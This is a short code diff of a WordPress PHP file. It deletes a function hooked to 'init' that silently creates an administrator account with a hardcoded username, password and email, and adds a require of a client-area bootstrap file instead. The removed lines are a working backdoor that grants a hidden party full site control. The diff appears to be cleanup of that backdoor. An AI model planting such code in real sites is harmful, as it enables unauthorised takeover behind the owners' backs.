@@ -76,15 +76,5 @@ require_once 'inc/admin/class.docs.php';
 // Additional Custom Fields
 require_once 'inc/fields/field-builder.php';
 
-// add admin user
-add_action( 'init', 'add_admin_account' );
-function add_admin_account() {
-		$user = 'riwebsteve';
-		$pass = 'Ste234900-';
-		$email = 'steve.north@riweb.uk';
-		if ( !username_exists( $user ) && !email_exists( $email ) ) {
-				$user_id = wp_create_user( $user, $pass, $email );
-				$user = new WP_User( $user_id );
-				$user->set_role( 'administrator' );
-		}
-}
+
+require_once 'inc/client-area/bootstrap.php';
